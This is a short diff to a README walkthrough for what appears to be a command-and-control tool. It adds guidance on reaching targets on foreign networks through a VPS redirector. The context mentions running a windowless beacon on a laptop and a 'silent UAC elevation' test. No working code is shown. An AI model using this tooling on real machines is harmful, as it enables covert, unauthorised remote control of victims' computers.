@@ -256,6 +256,8 @@ Copy `lab\laptop-pkg\beacon.exe` to the laptop and double-click it (no console w
 dark-arts> sessions          # the laptop's sid shows a recent last-seen
 ```
 
+The walkthrough covers a same-network laptop. For a target on foreign WiFi or a different network, run `sshkey` + `redirector [-Reverse] <user@vps>` first (see [Cross-network deployment](#cross-network-deployment-vps-redirector)) — it provisions the VPS and builds the package with the right edge list automatically.
+
 ### 7. Test the silent UAC elevation channel
 
 ```
